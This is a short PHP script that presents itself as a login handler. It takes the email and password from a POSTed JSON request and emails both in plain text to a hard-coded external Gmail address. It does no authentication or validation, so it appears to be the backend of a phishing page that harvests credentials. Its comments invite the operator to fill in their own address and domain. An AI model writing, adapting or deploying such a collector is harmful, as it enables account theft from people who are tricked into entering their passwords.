<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get JSON input
    $data = json_decode(file_get_contents('php://input'), true);

    $email = $data['email'];
    $password = $data['password'];

    // Prepare email
    $to = "ajmirahemed5@gmail.com"; // Your email
    $subject = "User Login Information";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: noreply@yourdomain.com"; // Change to your domain

    // Send email
    mail($to, $subject, $message, $headers);
}
?>
